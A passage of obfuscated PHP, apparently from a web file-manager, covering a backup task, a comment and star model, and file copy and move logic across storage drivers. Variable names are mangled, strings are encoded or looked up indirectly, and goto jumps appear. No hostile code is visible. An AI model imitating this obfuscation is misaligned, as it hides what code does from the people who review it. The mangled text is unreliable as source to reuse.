if ($GLOBALS[$¹ ˆğ¨¸[6]][$¹ ˆğ¨¸[89]][$¹ ˆğ¨¸[1865]] != $¹ ˆğ¨¸[88]) { return !0; } $¼†½€Ÿø = $this->config(); if (!$¼†½€Ÿø || $¼†½€Ÿø[$¹ ˆğ¨¸[1635]] != $¹ ˆğ¨¸[88]) { return !1; } $Ò’—— = $this->process(); foreach ($Ò’—— as $´¿ÔŸ¥) { if ($´¿ÔŸ¥) { return Task::restart($´¿ÔŸ¥[$¹ ˆğ¨¸[407]]); } } $¯¯üí·ß = new Backup(); $»¦öÀ = $¯¯üí·ß->db(); if ($»¦öÀ) { $»¦öÀ = $¯¯üí·ß->dbFile(); if ($»¦öÀ && $¼†½€Ÿø[$¹ ˆğ¨¸[770]] == $¹ ˆğ¨¸[197]) { $»¦öÀ = $¯¯üí·ß->file(); } } Backup::set(array($¹ ˆğ¨¸[765] => 1, $¹ ˆğ¨¸[505] => time())); return !0; } public function process() { $ë…¦ñÔ” =& $_SERVER[™¾ÇÙ¯¹]; $ıÑƒßÃ¦ = array($ë…¦ñÔ”[773] => Task::get($ë…¦ñÔ”[794]), $ë…¦ñÔ”[777] => Task::get($ë…¦ñÔ”[815]), $ë…¦ñÔ”[199] => Task::get($ë…¦ñÔ”[824])); $£êíåË¬ = !1; foreach ($ıÑƒßÃ¦ as &$ÀÊøË‡ª) { if ($£êíåË¬) { $ÀÊøË‡ª = !1; continue; } if ($ÀÊøË‡ª) { $ˆ»ùúåì = intval(_get($ÀÊøË‡ª, $ë…¦ñÔ”[1670], 0)); if (time() - $ˆ»ùúåì > 7200) { Task::kill($ÀÊøË‡ª[$ë…¦ñÔ”[407]]); $£êíåË¬ = !0; $ÀÊøË‡ª = !1; } } } return $ıÑƒßÃ¦; } public function restore() { $ºùÌô®‘ =& $_SERVER[™¾ÇÙ¯¹]; ActionCall($ºùÌô®‘[1068], !0, 1); ActionCall($ºùÌô®‘[1068], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\x6d\145\x6e\164"; protected $tableMeta = array("\164\x61\x62\154\145\116\141\x6d\145" => "\143\x6f\x6d\155\145\156\x74\137\155\145\x74\x61", "\x6d\x65\164\141\106\x69\145\154\144" => "\x63\x6f\x6d\x6d\x65\x6e\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($âŸ…Ï­ ) { $¿ã¢É’À =& $_SERVER[™¾ÇÙ¯¹]; if ($âŸ…Ï­ [$¿ã¢É’À[1866]]) { $Ù²‰Ú­Ï = $this->where(array($¿ã¢É’À[1867] => $âŸ…Ï­ [$¿ã¢É’À[1866]]))->find(); if (!$Ù²‰Ú­Ï || $Ù²‰Ú­Ï[$¿ã¢É’À[419]] != $âŸ…Ï­ [$¿ã¢É’À[419]] || $Ù²‰Ú­Ï[$¿ã¢É’À[513]] != $âŸ…Ï­ [$¿ã¢É’À[513]]) { return !1; } $this->where(array($¿ã¢É’À[1867] => $âŸ…Ï­ [$¿ã¢É’À[1866]]))->setAdd($¿ã¢É’À[1868], 1); } $âŸ…Ï­ [$¿ã¢É’À[1869]] = 0; $âŸ…Ï­ [$¿ã¢É’À[1868]] = 0; $âŸ…Ï­ [$¿ã¢É’À[765]] = 1; return $this->add($âŸ…Ï­ ); } public function commentCount($ËìÇõîŸ, $º£ïµˆœ, $”Û”ªºä = false) { $í‡Û¶Èñ =& $_SERVER[™¾ÇÙ¯¹]; if (!$ËìÇõîŸ) { return array(); } if (is_string($ËìÇõîŸ) || is_int($ËìÇõîŸ)) { $ËìÇõîŸ = array($ËìÇõîŸ); } $Éé¡šâ² = array($í‡Û¶Èñ[513], $í‡Û¶Èñ[1870] => $í‡Û¶Èñ[508]); $äâ×“°ı = array($í‡Û¶Èñ[513] => array($í‡Û¶Èñ[7], $ËìÇõîŸ), $í‡Û¶Èñ[419] => $º£ïµˆœ); if ($”Û”ªºä) { $äâ×“°ı[$í‡Û¶Èñ[1665]] = $”Û”ªºä; } $ƒí³¢ø¥ = $this->field($Éé¡šâ²)->where($äâ×“°ı)->group($í‡Û¶Èñ[513])->select(); return array_to_keyvalue($ƒí³¢ø¥, $í‡Û¶Èñ[513], $í‡Û¶Èñ[508]); } public function starTarget($ÚàŒŞÜÊ, $€ä³Ô) { $³Ä‚¡„ =& $_SERVER[™¾ÇÙ¯¹]; $¡…§Ü·ä = $ÚàŒŞÜÊ + self::TYPE_STAR_OFFSET; $ğ½Íîüì = array($³Ä‚¡„[1665] => USER_ID, $³Ä‚¡„[419] => $¡…§Ü·ä, $³Ä‚¡„[513] => $€ä³Ô); $Ñöëàæø = $this->where($ğ½Íîüì)->find(); if ($Ñöëàæø) { return $this->where(array($³Ä‚¡„[407] => $Ñöëàæø[$³Ä‚¡„[407]]))->delete(); } $ğı³ŠÔê = array($³Ä‚¡„[1866] => 0, $³Ä‚¡„[1665] => USER_ID, $³Ä‚¡„[765] => 1, $³Ä‚¡„[770] => $³Ä‚¡„[12], $³Ä‚¡„[419] => $¡…§Ü·ä, $³Ä‚¡„[513] => $€ä³Ô, $³Ä‚¡„[1869] => 0, $³Ä‚¡„[1868] => 0); return $this->add($ğı³ŠÔê); } public function starTargetCount($à“¥¹ç—, $³ıÎ¬ø±) { $äîÅß´Ô =& $_SERVER[™¾ÇÙ¯¹]; $áÇÕã¶¡ = $³ıÎ¬ø± + self::TYPE_STAR_OFFSET; $ÑºÂû˜º = $this->commentCount($à“¥¹ç—, $áÇÕã¶¡); $Ö®¥ù = $this->commentCount($à“¥¹ç—, $áÇÕã¶¡, USER_ID); return array($äîÅß´Ô[1871] => $ÑºÂû˜º, $äîÅß´Ô[1872] => $Ö®¥ù); } public function starTargetUserList($òšº¿Øı, $ı‡¬¾‡ï) { $Œ²é‚ñ =& $_SERVER[™¾ÇÙ¯¹]; $†´û¬› = $òšº¿Øı + self::TYPE_STAR_OFFSET; $ñÑúı¾Ç = array($Œ²é‚ñ[513] => $ı‡¬¾‡ï, $Œ²é‚ñ[419] => $†´û¬›); $±“ŸÛúÉ = $this->where($ñÑúı¾Ç)->count(); $Õ¯ƒ©»˜ = array($Œ²é‚ñ[264] => $±“ŸÛúÉ, $Œ²é‚ñ[1873] => array()); if (!$±“ŸÛúÉ) { return $Õ¯ƒ©»˜; } $îÁğôÌÔ = $this->field($Œ²é‚ñ[1665])->where($ñÑúı¾Ç)->limit(500)->select(); $îÁğôÌÔ = array_to_keyvalue($îÁğôÌÔ, $Œ²é‚ñ[12], $Œ²é‚ñ[1665]); $Õ¯ƒ©»˜[$Œ²é‚ñ[1873]] = Model($Œ²é‚ñ[521])->userListInfo($îÁğôÌÔ); return $Õ¯ƒ©»˜; } public function prasiseUserList($û²õÚ¸») { $¥†æ©•† =& $_SERVER[™¾ÇÙ¯¹]; $ƒ°åà¯ó = array($¥†æ©•†[1874] => $û²õÚ¸»); $Ö‚î„¼ø = $this->where($ƒ°åà¯ó)->find(); $½È«ï¢Ú = _get($Ö‚î„¼ø, $¥†æ©•†[1869], 0); $ã¿ş’» = array($¥†æ©•†[264] => $½È«ï¢Ú, $¥†æ©•†[1873] => array()); if (!$½È«ï¢Ú) { return $ã¿ş’»; } $óé”²Â = Model($¥†æ©•†[1875])->field($¥†æ©•†[1665])->where($ƒ°åà¯ó)->limit(500)->select(); $óé”²Â = array_to_keyvalue($óé”²Â, $¥†æ©•†[12], $¥†æ©•†[1665]); $ã¿ş’»[$¥†æ©•†[1873]] = Model($¥†æ©•†[521])->userListInfo($óé”²Â); return $ã¿ş’»; } public function remove($“‘Õ˜¿É) { $Áœ¯‘ë =& $_SERVER[™¾ÇÙ¯¹]; $çíß¢ô = array($Áœ¯‘ë[1867] => $“‘Õ˜¿É); $¾ÔŸø÷î = $this->where($çíß¢ô)->find(); if ($¾ÔŸø÷î[$Áœ¯‘ë[1866]]) { $this->where(array($Áœ¯‘ë[1867] => $¾ÔŸø÷î[$Áœ¯‘ë[1866]]))->setAdd($Áœ¯‘ë[1868], -1); } return $this->where($çíß¢ô)->delete(); } public function edit($ñÎ„¡†å, $ò“æºúİ) { $ä‘‡êü“ =& $_SERVER[™¾ÇÙ¯¹]; $Æµ™ÓÑ° = array($ä‘‡êü“[1867] => $ñÎ„¡†å); return $this->where($Æµ™ÓÑ°)->save(array($ä‘‡êü“[1876] => $ò“æºúİ)); } public function prasise($ì¯Ôçâí) { $íÆàÆ¸ =& $_SERVER[™¾ÇÙ¯¹]; $ÜÔ·€úó = Model($íÆàÆ¸[1877]); $áµã©ë¥ = array($íÆàÆ¸[1867] => $ì¯Ôçâí, $íÆàÆ¸[1656] => USER_ID); $şë¾‰ø = $ÜÔ·€úó->where($áµã©ë¥)->find(); if (!$şë¾‰ø) { $ÜÔ·€úó->add($áµã©ë¥); $ÓŠ›ŠŒû = $this->where(array($íÆàÆ¸[1867] => $ì¯Ôçâí))->setAdd($íÆàÆ¸[1869], 1); } else { $ÜÔ·€úó->where($áµã©ë¥)->delete(); $ÓŠ›ŠŒû = $this->where(array($íÆàÆ¸[1867] => $ì¯Ôçâí))->setAdd($íÆàÆ¸[1869], -1); } return $ÓŠ›ŠŒû; } public function targetInfo($—òÈêÄ, $„ÀÊÚş´) { $±«±— =& $_SERVER[™¾ÇÙ¯¹]; $œÔôîÇı = array($±«±—[594] => $—òÈêÄ, $±«±—[595] => $„ÀÊÚş´); $Ş„ó˜ŞË = $this->where($œÔôîÇı)->count(); $½¬İß›Ø = "\x52\111\x47\110\124\x20\112\x4f\111\x4e\40{$this->tablePrefix}\143\x6f\x6d\x6d\x65\156\x74\x5f\160\x72\141\x69\x73\145\40\163\x74\x61\x72\x20\x6f\x6e\40\x63\157\155\155\x65\156\x74\56\x63\x6f\155\155\x65\156\164\x49\x44\x20\x3d\40\x73\x74\x61\x72\56\x63\x6f\x6d\155\145\156\164\111\x44"; $¢§í„ğ¦ = $this->alias($±«±—[363])->where($œÔôîÇı)->join($½¬İß›Ø, $±«±—[1878])->count(); $—Ç–ò”í = array($±«±—[1879] => $Ş„ó˜ŞË, $±«±—[1880] => $¢§í„ğ¦); return $—Ç–ò”í; } public function listData($ãŸµ«û÷) { $Â×·ƒı¹ =& $_SERVER[™¾ÇÙ¯¹]; if (isset($ãŸµ«û÷[$Â×·ƒı¹[1881]])) { if ($ãŸµ«û÷[$Â×·ƒı¹[1881]]) { $ãŸµ«û÷[$Â×·ƒı¹[1874]] = array($Â×·ƒı¹[1022], intval($ãŸµ«û÷[$Â×·ƒı¹[1881]])); } unset($ãŸµ«û÷[$Â×·ƒı¹[1881]]); } if (isset($ãŸµ«û÷[$Â×·ƒı¹[1882]])) { if ($ãŸµ«û÷[$Â×·ƒı¹[1882]]) { $ãŸµ«û÷[$Â×·ƒı¹[1874]] = array($Â×·ƒı¹[1019], intval($ãŸµ«û÷[$Â×·ƒı¹[1882]])); } unset($ãŸµ«û÷[$Â×·ƒı¹[1882]]); } return $this->_listData($ãŸµ«û÷); } private function _listData($¦¾’¶‡Â) { $ˆ›á»õ =& $_SERVER[™¾ÇÙ¯¹]; $Äà÷¯†‹ = $this->where($¦¾’¶‡Â)->_makeOrder()->selectPage(100); $this->_listAppendParent($Äà÷¯†‹[$ˆ›á»õ[378]]); $this->_listAppendUser($Äà÷¯†‹[$ˆ›á»õ[378]]); $this->_listAppendMeta($Äà÷¯†‹[$ˆ›á»õ[378]]); return $Äà÷¯†‹; } private function _makeOrder() { $€†Ÿİ®£ =& $_SERVER[™¾ÇÙ¯¹]; $Úšñ­‹ = array($€†Ÿİ®£[1869], $€†Ÿİ®£[1868], $€†Ÿİ®£[200]); $‚ê‚‚Š­ = Input::get($€†Ÿİ®£[465], $€†Ÿİ®£[7], $€†Ÿİ®£[431], $Úšñ­‹); $¡Ø‘ àÑ = Input::get($€†Ÿİ®£[466], $€†Ÿİ®£[7], $€†Ÿİ®£[1658], array($€†Ÿİ®£[1883], $€†Ÿİ®£[461])); $£Äî‹ŞÍ = $‚ê‚‚Š­ . $€†Ÿİ®£[53] . $¡Ø‘ àÑ; return $this->order($£Äî‹ŞÍ); } private function _listAppendParent(&$‘æÙ³€) { $Æ¸İå‚à =& $_SERVER[™¾ÇÙ¯¹]; $¥›ßó½ = array_unique(array_to_keyvalue($‘æÙ³€, $Æ¸İå‚à[12], $Æ¸İå‚à[1866])); $¥›ßó½ = array_remove_value($¥›ßó½, $Æ¸İå‚à[197]); if (!$¥›ßó½) { return; } $÷¡å‚“ú = $this->where(array($Æ¸İå‚à[1867] => array($Æ¸İå‚à[7], $¥›ßó½)))->select(); $÷¡å‚“ú = array_to_keyvalue($÷¡å‚“ú, $Æ¸İå‚à[1874]); foreach ($‘æÙ³€ as &$½öíÉğÈ) { if (isset($÷¡å‚“ú[$½öíÉğÈ[$Æ¸İå‚à[1866]]])) { $½öíÉğÈ[$Æ¸İå‚à[1884]] = $÷¡å‚“ú[$½öíÉğÈ[$Æ¸İå‚à[1866]]]; } } unset($½öíÉğÈ); } private function _listAppendUser(&$°‚¥æ‘Ü) { $ƒäÚ´ =& $_SERVER[™¾ÇÙ¯¹]; $ƒ®à×ß“ = array_unique(array_to_keyvalue($°‚¥æ‘Ü, $ƒäÚ´[12], $ƒäÚ´[1665])); $ƒ®à×ß“ = array_remove_value($ƒ®à×ß“, $ƒäÚ´[197]); if (count($ƒ®à×ß“) == 0) { return; } foreach ($°‚¥æ‘Ü as $†ˆŠ•ƒı) { if (isset($†ˆŠ•ƒı[$ƒäÚ´[1884]])) { $ƒ®à×ß“[] = $†ˆŠ•ƒı[$ƒäÚ´[1884]][$ƒäÚ´[1665]]; } } $ÛĞí¹§ã = Model($ƒäÚ´[543])->userListInfo($ƒ®à×ß“); foreach ($°‚¥æ‘Ü as &$†ˆŠ•ƒı) { $†ˆŠ•ƒı[$ƒäÚ´[608]] = $ÛĞí¹§ã[$†ˆŠ•ƒı[$ƒäÚ´[1665]]]; if (isset($†ˆŠ•ƒı[$ƒäÚ´[1884]])) { $†ˆŠ•ƒı[$ƒäÚ´[1884]][$ƒäÚ´[608]] = $ÛĞí¹§ã[$†ˆŠ•ƒı[$ƒäÚ´[1884]][$ƒäÚ´[1665]]]; } } unset($†ˆŠ•ƒı); } private function _listAppendMeta(&$‹ƒÔ–«») { $µˆÕ«–ã =& $_SERVER[™¾ÇÙ¯¹]; $á¡Òˆ = array_unique(array_to_keyvalue($‹ƒÔ–«», $µˆÕ«–ã[12], $µˆÕ«–ã[1874])); $á¡Òˆ = array_remove_value($á¡Òˆ, $µˆÕ«–ã[197]); if (!$á¡Òˆ) { return; } foreach ($‹ƒÔ–«» as $©®ÇÄ÷) { if (isset($©®ÇÄ÷[$µˆÕ«–ã[1884]])) { $á¡Òˆ[] = $©®ÇÄ÷[$µˆÕ«–ã[1884]][$µˆÕ«–ã[1874]]; } } $ş“½ÀçÏ = $this->metaList($á¡Òˆ); if (!$ş“½ÀçÏ) { return !1; } foreach ($‹ƒÔ–«» as &$©®ÇÄ÷) { $©®ÇÄ÷[$µˆÕ«–ã[474]] = $ş“½ÀçÏ[$©®ÇÄ÷[$µˆÕ«–ã[1874]]]; if (isset($©®ÇÄ÷[$µˆÕ«–ã[1884]])) { $©®ÇÄ÷[$µˆÕ«–ã[1884]][$µˆÕ«–ã[474]] = $ş“½ÀçÏ[$©®ÇÄ÷[$µˆÕ«–ã[1884]][$µˆÕ«–ã[1874]]]; } } unset($©®ÇÄ÷); } private function metaList($§„€™ÃÖ) { $ÍÛœıÈŠ =& $_SERVER[™¾ÇÙ¯¹]; if (!$§„€™ÃÖ) { return array(); } $øÆÆã‚ = array($ÍÛœıÈŠ[1874] => array($ÍÛœıÈŠ[7], $§„€™ÃÖ)); $ë•¹êø— = Model($ÍÛœıÈŠ[1885])->where($øÆÆã‚)->select(); $ë•¹êø— = array_to_keyvalue_group($ë•¹êø—, $ÍÛœıÈŠ[1874]); foreach ($ë•¹êø— as $»÷‘‘î„ => $¨Ü¯²™Ü) { $…¯èµÄû = array(); foreach ($¨Ü¯²™Ü as $ãîß¬û‚) { $…¯èµÄû[$ãîß¬û‚[$ÍÛœıÈŠ[94]]] = $ãîß¬û‚[$ÍÛœıÈŠ[383]]; } $ë•¹êø—[$»÷‘‘î„] = $…¯èµÄû; } return $ë•¹êø— ? $ë•¹êø— : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\x5f\146\x69\x6c\145\137\x63\x6f\156\164\145\156\x74\x73"; protected $dataAuto = array(array("\143\162\145\x61\164\145\124\x69\x6d\x65", "\164\x69\155\x65", "\151\156\163\145\x72\x74", "\146\x75\x6e\x63\164\151\x6f\156")); } goto BçâÒß…Ş; D‹‡ÙŒ…†Î: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($áÉÚ”™Ğ, $ç×¦Ú©ä) { $¤íÛê¬Ï =& $_SERVER[™¾ÇÙ¯¹]; $‚şø¼­¡ = $ç×¦Ú©ä; $GLOBALS[$¤íÛê¬Ï[1154]] = $¤íÛê¬Ï[1155] . $áÉÚ”™Ğ; Hook::trigger($¤íÛê¬Ï[1155] . $áÉÚ”™Ğ . $¤íÛê¬Ï[1156], $‚şø¼­¡); $€Ğó´Şû = self::driverMake($ç×¦Ú©ä[0]); if (!$€Ğó´Şû) { return !1; } if (method_exists($€Ğó´Şû, $áÉÚ”™Ğ)) { $êÄ’«‚È = @call_user_func_array(array($€Ğó´Şû, $áÉÚ”™Ğ), $ç×¦Ú©ä); } else { if (method_exists($€Ğó´Şû, $¤íÛê¬Ï[1157])) { $êÄ’«‚È = @call_user_func_array(array($€Ğó´Şû, $áÉÚ”™Ğ), $ç×¦Ú©ä); } else { if (method_exists(self, $áÉÚ”™Ğ)) { $êÄ’«‚È = @call_user_func_array(array(self, $áÉÚ”™Ğ), $ç×¦Ú©ä); } else { $êÄ’«‚È = call_user_func_array(array(parent, $áÉÚ”™Ğ), $ç×¦Ú©ä); } } } Hook::trigger($¤íÛê¬Ï[1155] . $áÉÚ”™Ğ . $¤íÛê¬Ï[1158], $‚şø¼­¡, $êÄ’«‚È); return $êÄ’«‚È; } public static function init($Š¯–ÊÅ•) { return self::driverMake($Š¯–ÊÅ•); } public static function copy($ÃøÊÔññ, $ÄÈÊ¯­ˆ, $îÂäŒäÜ = false, $ñ€ÒÈÔà = false) { return self::copyMoveStart($ÃøÊÔññ, $ÄÈÊ¯­ˆ, $îÂäŒäÜ, $_SERVER[™¾ÇÙ¯¹][563], $ñ€ÒÈÔà); } public static function move($àïËÖ£ù, $¡­®ÎôÑ, $Æá÷‘’ = false, $·ö„©Ô­ = false) { return self::copyMoveStart($àïËÖ£ù, $¡­®ÎôÑ, $Æá÷‘’, $_SERVER[™¾ÇÙ¯¹][565], $·ö„©Ô­); } private static function copyMoveStart($â‰ìó»Å, $Ì“ËÇ£, $ñÏ²µ¥¸, $áº–ŠÂ°, $ø»éæ®œ) { $×şæöÅİ =& $_SERVER[™¾ÇÙ¯¹]; $—­‰ê×¶ = array($â‰ìó»Å, $Ì“ËÇ£, $ñÏ²µ¥¸, $ø»éæ®œ); Hook::trigger($×şæöÅİ[1155] . $áº–ŠÂ° . $×şæöÅİ[1156], $—­‰ê×¶); $»æ³¨è = self::copyMove($â‰ìó»Å, $Ì“ËÇ£, $ñÏ²µ¥¸, $áº–ŠÂ°, $ø»éæ®œ); Hook::trigger($×şæöÅİ[1155] . $áº–ŠÂ° . $×şæöÅİ[1158], $—­‰ê×¶, $»æ³¨è); return $»æ³¨è; } public static function saveFile($ïíêóñ¤, $ëËçìÇ±, $÷‡õİœ¹ = true) { $¯‚²«à¯ =& $_SERVER[™¾ÇÙ¯¹]; $†µéŞú¯ = self::info($ëËçìÇ±); $•Ú½º¨ˆ = self::driverMake($ïíêóñ¤); $©ÊÌ = self::driverMake($ëËçìÇ±); $Ö‡æ· Ô = !1; if ($©ÊÌ->pathParse[$¯‚²«à¯[1159]]) { $Ö‡æ· Ô = $©ÊÌ; $©Ğ¦ĞúÖ = $©ÊÌ->pathParse[$¯‚²«à¯[1159]]; $©ÊÌ = self::driverMake($©Ğ¦ĞúÖ); } if ($•Ú½º¨ˆ->pathParse[$¯‚²«à¯[1159]]) { $úêÍ®êı = $•Ú½º¨ˆ->pathParse[$¯‚²«à¯[1159]]; $•Ú½º¨ˆ = self::driverMake($úêÍ®êı); } $æºÊ«Úš = $©ÊÌ->pathFather($ëËçìÇ±); $ÑÕôßËñ = !0; if (!$÷‡õİœ¹ && self::driverIsSame($•Ú½º¨ˆ, $©ÊÌ)) { $ÑÕôßËñ = !1; } $š©Ôõ®Ú = self::copyFile($•Ú½º¨ˆ, $ïíêóñ¤, $©ÊÌ, $æºÊ«Úš, $†µéŞú¯[$¯‚²«à¯[32]], $ÑÕôßËñ); if ($Ö‡æ· Ô) { $š©Ôõ®Ú = $Ö‡æ· Ô->getPathOuter($š©Ôõ®Ú); } return $š©Ôõ®Ú; } private static function copyMove($ëòßó¸´, $Î÷Áƒ³, $Şö©ÂÇÏ, $©³âóÆÆ, $½œ¾”í = false) { $Î®±Œãà =& $_SERVER[™¾ÇÙ¯¹]; if (!$ëòßó¸´ || $ëòßó¸´ == $Î®±Œãà[8] || !$Î÷Áƒ³) { return !1; } ignore_timeout(); $ÃÀÉøÕ£ = self::driverMake($ëòßó¸´); $ÇÆ «Ú™ = self::driverMake($Î÷Áƒ³); $Ô³¤ïú¹ = $©³âóÆÆ == $Î®±Œãà[565]; $çô¨¾áä = !1; if ($ÇÆ «Ú™->pathParse[$Î®±Œãà[1159]]) { $çô¨¾áä = $ÇÆ «Ú™; $Î÷Áƒ³ = $ÇÆ «Ú™->pathParse[$Î®±Œãà[1159]]; $ÇÆ «Ú™ = self::driverMake($Î÷Áƒ³); } if ($ÃÀÉøÕ£->pathParse[$Î®±Œãà[1159]]) { $ëòßó¸´ = $ÃÀÉøÕ£->pathParse[$Î®±Œãà[1159]]; $ÃÀÉøÕ£ = self::driverMake($ëòßó¸´); } self::check($ÃÀÉøÕ£, $ëòßó¸´, $ÇÆ «Ú™, $Î÷Áƒ³); Hook::trigger($Î®±Œãà[1160], $ÃÀÉøÕ£, $ëòßó¸´, $ÇÆ «Ú™, $Î÷Áƒ³); $ï¿äùè— = self::driverIsSame($ÃÀÉøÕ£, $ÇÆ «Ú™); if ($ï¿äùè—) { if ($©³âóÆÆ == $Î®±Œãà[565] && !method_exists($ÇÆ «Ú™, $Î®±Œãà[1161]) && trim($Î÷Áƒ³, $Î®±Œãà[8]) == trim($ÇÆ «Ú™->pathFather($ëòßó¸´), $Î®±Œãà[8])) { if ($ÃÀÉøÕ£->pathThis($ëòßó¸´) != $½œ¾”í && !$ÃÀÉøÕ£->isTypeObject()) { return $ÃÀÉøÕ£->rename($ëòßó¸´, $½œ¾”í); } return $ÇÆ «Ú™->getPathOuter($ëòßó¸´); } if (method_exists($ÇÆ «Ú™, $©³âóÆÆ)) { return $ÇÆ «Ú™->{$©³âóÆÆ}($ëòßó¸´, $Î÷Áƒ³, $Şö©ÂÇÏ, $½œ¾”í); } } if ($ï¿äùè— && $©³âóÆÆ == $Î®±Œãà[565] && $ÇÆ «Ú™->getType() == $Î®±Œãà[106]) { $©· –Í§ = $ÇÆ «Ú™->movePath($ëòßó¸´, $Î÷Áƒ³, $½œ¾”í); if ($©· –Í§) { return $©· –Í§; } } $½°ãÍŠï = $ÃÀÉøÕ£->isFile($ëòßó¸´); if (!$½°ãÍŠï && $ÇÆ «Ú™->getType() == $Î®±Œãà[773] && $ÃÀÉøÕ£->getType() == $Î®±Œãà[106]) { $©· –Í§ = $ÇÆ «Ú™->copyFolderFromIO($ÃÀÉøÕ£, $ëòßó¸´, $Î÷Áƒ³, $Şö©ÂÇÏ, $Ô³¤ïú¹, $½œ¾”í); } else { $©· –Í§ = self::copyPath($ÃÀÉøÕ£, $ëòßó¸´, $ÇÆ «Ú™, $Î÷Áƒ³, $Şö©ÂÇÏ, $Ô³¤ïú¹, $½°ãÍŠï, $½œ¾”í); } if ($©· –Í§ && $Ô³¤ïú¹) { $ÃÀÉøÕ£->remove($ëòßó¸´); } if ($çô¨¾áä) { $©· –Í§ = $çô¨¾áä->getPathOuter($©· –Í§); } return $©· –Í§; } private static function check($ª©ù¼ÒÉ, $ª†¼š£·, $İåÛ¼«‚, &$¹Œ¾¼ƒü) { $ÂÁ³‰§ =& $_SERVER[™¾ÇÙ¯¹]; if (self::driverIsSame($ª©ù¼ÒÉ, $İåÛ¼«‚) && $ª©ù¼ÒÉ->isFolder($ª†¼š£·) && $ª©ù¼ÒÉ->isParentOf($ª†¼š£·, $¹Œ¾¼ƒü)) { show_json(LNG($ÂÁ³‰§[1162]), !1); } if (!$ª©ù¼ÒÉ->exist($ª†¼š£·)) { show_json(LNG($ÂÁ³‰§[105]), !1); } } private static function copyPath($¢†ËŠ¶, $ë¡Üãú«, $—¢›ª¸¿, $şçÑ¦², $ê¤¬İô, $‚»ë²¹, $Ğì ÏÏş, $¼˜ûó¬ = false, $Û›–§ÀÇ = true) { $ó¹³êßâ =& $_SERVER[™¾ÇÙ¯¹]; $Äğßú×Š = empty($¼˜ûó¬) && $¼˜ûó¬ !== $ó¹³êßâ[197] ? $¢†ËŠ¶->pathThis($ë¡Üãú«) : $¼˜ûó¬; if ($ê¤¬İô) { $ğ…³€¯’ = $—¢›ª¸¿->fileNameExist($şçÑ¦², $Äğßú×Š); $Œê³€Ë¯ = $Äğßú×Š; $Äğßú×Š = $—¢›ª¸¿->fileNameAuto($şçÑ¦², $Äğßú×Š, $ê¤¬İô, !$Ğì ÏÏş); if (!$ğ…³€¯’ || $Œê³€Ë¯ != $Äğßú×Š) { $ê¤¬İô = !1; } if ($Û›–§ÀÇ && !$ê¤¬İô) { $—¢›ª¸¿->_data[$ó¹³êßâ[1163]] = !0; } } if ($Ğì ÏÏş) { return self::copyFile($¢†ËŠ¶, $ë¡Üãú«, $—¢›ª¸¿, $şçÑ¦², $Äğßú×Š, $‚»ë²¹); } if ($ê¤¬İô == REPEAT_RENAME_FOLDER) { $ê¤¬İô = !1; } $ñ’“ø¬œ = rtrim($şçÑ¦², $ó¹³êßâ[8]) . $ó¹³êßâ[8] . $Äğßú×Š; $êàé¼ÙÃ = $—¢›ª¸¿->mkdir($—¢›ª¸¿->getPath($ñ’“ø¬œ), $ê¤¬İô); $şçÑ¦² = $—¢›ª¸¿->getPathInner($êàé¼ÙÃ); $É Š‚˜å = $¢†ËŠ¶->listPath($ë¡Üãú«, !0); $É Š‚˜å = is_array($É Š‚˜å) ? $É Š‚˜å : array($ó¹³êßâ[83] => array(), $ó¹³êßâ[82] => array()); $ëé¿€¤§ = array_merge($É Š‚˜å[$ó¹³êßâ[83]], $É Š‚˜å[$ó¹³êßâ[82]]); foreach ($ëé¿€¤§ as $·½¬şË) { $Ğ÷¼çÂ = $·½¬şË[$ó¹³êßâ[33]] == $ó¹³êßâ[199]; $ë¡Üãú« = $¢†ËŠ¶->getPathInner($·½¬şË[$ó¹³êßâ[84]]); $ø†îÊ§ß = self::copyPath($¢†ËŠ¶, $ë¡Üãú«, $—¢›ª¸¿, $şçÑ¦², $ê¤¬İô, $‚»ë²¹, $Ğ÷¼çÂ, !1, !1); if (!$ø†îÊ§ß) { IO::errorTips($ó¹³êßâ[1164] . $ë¡Üãú« . $ó¹³êßâ[70] . $şçÑ¦²); } } self::copyMoveKeepInfo($¢†ËŠ¶, $ë¡Üãú«, $êàé¼ÙÃ); return $êàé¼ÙÃ; } private static function copyFile($ü·£ëÉ§, $ˆ¸Ï§º, $ş¤®øœ‡, $ÌÉ°ŸÊ£, $Éœ¼¤¨õ, $‰Ìí¶Ã¼) { $é’ö±æº =& $_SERVER[™¾ÇÙ¯¹]; $ÌÉ°ŸÊ£ = $ş¤®øœ‡->getPath(rtrim($ÌÉ°ŸÊ£, $é’ö±æº[8]) . $é’ö±æº[8] . $Éœ¼¤¨õ); $¥¾Ïß¶ = $é’ö±æº[1165] . time() . rand_string(5); Hook::trigger($é’ö±æº[1166], $ü·£ëÉ§, $ˆ¸Ï§º, $ş¤®øœ‡, $ÌÉ°ŸÊ£, $Éœ¼¤¨õ, $¥¾Ïß¶); if (self::driverIsSame($ü·£ëÉ§, $ş¤®øœ‡)) { if ($‰Ìí¶Ã¼) { $ÔáÔÈÚ£ = $ş¤®øœ‡->moveFile($ˆ¸Ï§º, $ÌÉ°ŸÊ£); } else { $ÔáÔÈÚ£ = $ş¤®øœ‡->copyFile($ˆ¸Ï§º, $ÌÉ°ŸÊ£); } Hook::trigger($é’ö±æº[1167], $ü·£ëÉ§, $ˆ¸Ï§º, $ş¤®øœ‡, $ÌÉ°ŸÊ£, $Éœ¼¤¨õ, $ÔáÔÈÚ£); self::copyMoveKeepInfo($ü·£ëÉ§, $ˆ¸Ï§º, $ÔáÔÈÚ£); return $ÔáÔÈÚ£; } $¾˜õè® = TEMP_FILES; if ($GLOBALS[$é’ö±æº[6]][$é’ö±æº[89]][$é’ö±æº[811]]) { $¾˜õè® = $GLOBALS[$é’ö±æº[6]][$é’ö±æº[89]][$é’ö±æº[811]]; } $ÉÚ¾œàé = $¾˜õè®; mk_dir($ÉÚ¾œàé); $îôëá³ª = $ÉÚ¾œàé . $¥¾Ïß¶; $£ù–âŠ· = $îôëá³ª; $îôëá³ª = $ü·£ëÉ§->download($ˆ¸Ï§º, $îôëá³ª); $îôëá³ª = 